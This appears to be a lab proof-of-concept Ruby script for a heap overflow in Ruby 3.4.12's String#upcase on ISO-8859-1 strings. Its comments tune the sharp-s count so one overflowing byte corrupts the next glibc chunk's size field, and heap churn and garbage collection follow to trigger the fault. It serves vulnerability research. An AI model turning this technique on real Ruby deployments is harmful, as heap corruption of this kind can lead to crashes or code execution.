# Parity-flipped variant: one leading 1-byte char before the sharp-s run.
# to advances by 1 for 'a', then by 2 per sharp-s -> to can equal to_end-1
# with capa EVEN -> overflow offset R = 24+capa = N+45 EVEN.
# N ≡ 11 (mod 16) => R ≡ 8 (mod 16): the single 0x53 byte lands on the
# NEXT glibc chunk's size-field LSB (stock glibc, no ASan).
# Run: lab/build/plain/ruby-3.4.12-plain/bin/ruby <this> N
n = (ARGV[0] || 43).to_i
s = ("a".b + "\xDF".b * n)
s.force_encoding(Encoding::ISO_8859_1)
t = s.upcase
print "N=#{n} mixed upcase ok, out len=#{t.bytesize}\n"
3000.times { (Array.new(200) { "payload#{object_id}" }).join }
a = []; 500.times { a << ("x" * 64) }
GC.start
print "N=#{n} mixed churn ok\n"
